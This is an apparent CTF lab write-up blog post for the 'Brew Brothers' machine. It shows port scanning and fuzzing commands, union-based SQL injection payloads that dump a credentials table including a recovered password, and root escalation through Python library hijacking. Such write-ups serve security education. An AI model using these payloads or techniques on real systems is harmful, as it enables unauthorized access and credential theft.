<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>Brew Brothers</title><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Brew Brothers" />
<meta name="author" content="FmF" />
<meta property="og:locale" content="en_US" />
<link rel="canonical" href="http://localhost:4000/parrotctf-brew-brothers.html" />
<meta property="og:url" content="http://localhost:4000/parrotctf-brew-brothers.html" />
<meta property="og:site_name" content="FmF - Hacking blog ü©ª" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-06-03T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Brew Brothers" />
<script type="application/ld+json">
{"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/parrotctf-brew-brothers.html"},"author":{"@type":"Person","name":"FmF"},"@type":"BlogPosting","url":"http://localhost:4000/parrotctf-brew-brothers.html","headline":"Brew Brothers","dateModified":"2023-06-03T00:00:00-06:00","datePublished":"2023-06-03T00:00:00-06:00","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="FmF - Hacking blog ü©ª" /><link rel="shortcut icon" type="image/x-icon" href="/logo.png" />
  <link rel="stylesheet" href="/assets/css/main.css" />
</head><body a="dark">
    <main class="page-content" aria-label="Content">
      <div class="w">
        <a href="/">../</a><article>
  <p class="post-meta">
    <time datetime="2023-06-03 00:00:00 -0600">2023-06-03</time>
  </p>
  
  <h1>Brew Brothers</h1>

  <p><img src="/assets/img/BrewBrothers/1.jpg" width="800" /></p>

<p><a href="https://parrot-ctfs.com/">ü¶ú Parrot CTFs</a> is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.</p>

<p>This is an easy difficulty machine that exploits a SQL injection vulnerability and library hijacking in a Python script to gain root privileges.</p>

<h1 id="content">Content:</h1>

<ul>
  <li><a href="#enumeration-">Enumeration</a></li>
  <li><a href="#sqli-">SQLI</a></li>
  <li><a href="#privilege-escalation-">Privilege escalation</a></li>
</ul>

<h1 id="enumeration-">Enumeration üîé:</h1>

<p>We start by using <code class="language-plaintext highlighter-rouge">ping</code> to check the TTL of the machine to determine the OS we are dealing with.</p>

<p><img src="/assets/img/BrewBrothers/2.png" width="600" /></p>

<p>Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href="https://ostechnix.com/identify-operating-system-ttl-ping/">Identify OS using TTL value</a>.</p>

<p>Now, let‚Äôs go with an nmap scan to view the open ports.</p>

<p><code class="language-plaintext highlighter-rouge">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.32 -oN allPorts</code></p>

<p><code class="language-plaintext highlighter-rouge">-p-</code> ‚Äì&gt; We are doing a scan against all 65535 ports to search for open ports.</p>

<p><code class="language-plaintext highlighter-rouge">--open</code> ‚Äì&gt; It will only report open ports.</p>

<p><code class="language-plaintext highlighter-rouge">-sS</code> ‚Äì&gt; It can be performed quickly, scanning thousands of ports per second.</p>

<p><code class="language-plaintext highlighter-rouge">--min-rate 5000</code> ‚Äì&gt; It sets the minimum rate of packets sent per second to 5000.</p>

<p><code class="language-plaintext highlighter-rouge">-n</code> ‚Äì&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p>

<p><code class="language-plaintext highlighter-rouge">-v</code> ‚Äì&gt; It will be verbose in its output.</p>

<p><code class="language-plaintext highlighter-rouge">-Pn</code> ‚Äì&gt; This option skips the host discovery stage.</p>

<p><code class="language-plaintext highlighter-rouge">-oN</code> ‚Äì&gt; It will save the output in a file called ‚ÄúallPorts‚Äù.</p>

<p>We find out the following open ports:</p>

<p><img src="/assets/img/BrewBrothers/3.png" width="600" /></p>

<p>Let‚Äôs take a look at what the page has.</p>

<p><img src="/assets/img/BrewBrothers/4.png" width="600" /></p>

<p>Well‚Ä¶ nothing, it is a default page of apache2, so let‚Äôs start fuzzing.</p>

<p>You can use whatever fuzzing tool you want, in my case I am going to use <code class="language-plaintext highlighter-rouge">wfuzz</code>.</p>

<p><code class="language-plaintext highlighter-rouge">wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/FUZZ</code></p>

<p>We are doing a simple fuzzing to find directories and we find website that seems interesting.</p>

<p><img src="/assets/img/BrewBrothers/5.png" width="600" /></p>

<p>There is an <code class="language-plaintext highlighter-rouge">about.html</code> page, but it is not interesting.</p>

<p>So let‚Äôs start fuzzing again but this time let‚Äôs search for <code class="language-plaintext highlighter-rouge">.html</code> pages.</p>

<p><code class="language-plaintext highlighter-rouge">wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/website/FUZZ.html</code></p>

<p>We found these: <code class="language-plaintext highlighter-rouge">contact.html</code> and <code class="language-plaintext highlighter-rouge">search.html</code>.</p>

<p>The <code class="language-plaintext highlighter-rouge">contact.html</code> page doesn‚Äôt appear to have any functional or reflected elements where we can inject something.</p>

<p>However the <code class="language-plaintext highlighter-rouge">search.html</code> page is interesting because is trying to get data from something so we can try to test for SQLI.</p>

<h1 id="sqli-">SQLI üíâ:</h1>

<p>So how can we know if this is vulnerable to a SQL injection?, let‚Äôs do a simple injection like <a>‚Äô OR 1=1‚Äì -</a> if this give us all the data that the actual db has, we can keep doing futher injections to try to get creds if there exists.</p>

<p><img src="/assets/img/BrewBrothers/6.png" width="400" /></p>

<p>Yeah! there is a result of all the entries that are in the actual db.</p>

<p>Let‚Äôs start doing more injections üíâ:</p>

<p>This is to view which fields of output we have control over.</p>

<p><code class="language-plaintext highlighter-rouge">' union select 1,2-- -</code></p>

<p><img src="/assets/img/BrewBrothers/7.png" width="100" /></p>

<p>This is to view all the available databases. There, we can see an interesting database name, which is <a>creds</a>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union select 1,group_concat(schema_name) from information_schema.schemata-- -
</code></pre></div></div>

<p><img src="/assets/img/BrewBrothers/8.png" width="500" /></p>

<p>With this, we can view the table names of the database, and there is only one table, which is named <code class="language-plaintext highlighter-rouge">credentials</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union select 1,group_concat(table_name) from information_schema.tables where table_schema="creds"-- -
</code></pre></div></div>

<p><img src="/assets/img/BrewBrothers/9.png" width="180" /></p>

<p>With this, we can see the column names, which are <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union select 1,group_concat(column_name) from information_schema.columns where table_schema="creds" and table_name="credentials"-- -
</code></pre></div></div>

<p><img src="/assets/img/BrewBrothers/10.png" width="300" /></p>

<p>So know that we have enumerating the db let‚Äôs retrive all the usernames and passwords.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union select 1,group_concat(username,":",password) from creds.credentials-- -
</code></pre></div></div>

<p><img src="/assets/img/BrewBrothers/11.png" width="300" /></p>

<p>With this we can retrive only one credential that is: charles:pyvzngr</p>

<p>You can learn to do this injections <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection">here</a>, and remember there is a lot of material out there for you to learn more about SQLI.</p>

<p>So now that we have the credentials, we can try to log in through SSH, and once successful, we will have access to the machine as the user ‚Äú<strong>charles</strong>‚Äù.</p>

<h1 id="privilege-escalation-">Privilege escalation üö©:</h1>

<p>Now that we are inside the machine you need to do some things to ensure smooth operation:</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">bash</code></li>
  <li><code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li>
</ol>

<p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code>.</p>

<p>We need to enumerate the system to find a way to escalate privileges.</p>

<p>One thing I always check first is <code class="language-plaintext highlighter-rouge">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.</p>

<p>More info about privilege escalation check <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">here</a>.</p>

<p><img src="/assets/img/BrewBrothers/12.png" width="600" /></p>

<p>We can see that we can execute a python3 script like root user but we can‚Äôt edit it :(</p>

<p><img src="/assets/img/BrewBrothers/13.png" width="600" /></p>

<p>The script basically hashes a random value and writes it to a file. It doesn‚Äôt seem to be useful, but we can see that it imports various libraries.</p>

<p>The issue here is that we have write permissions in the directory where the Python3 script is located. Thanks to the priority python library path, we can add a malicious Python3 script to gain a shell with root user privileges. To accomplish this, we need to create a Python3 file and include the name of the module that is being imported, like this:</p>

<p><img src="/assets/img/BrewBrothers/14.png" width="600" /></p>

<p>Now, the only thing we need to do to become root is to execute the script with sudo privileges.</p>

<p><img src="/assets/img/BrewBrothers/15.png" width="600" /></p>

<p>Hope you like it and learn something new :)</p>

</article>
      </div>
    </main>
  </body>
</html>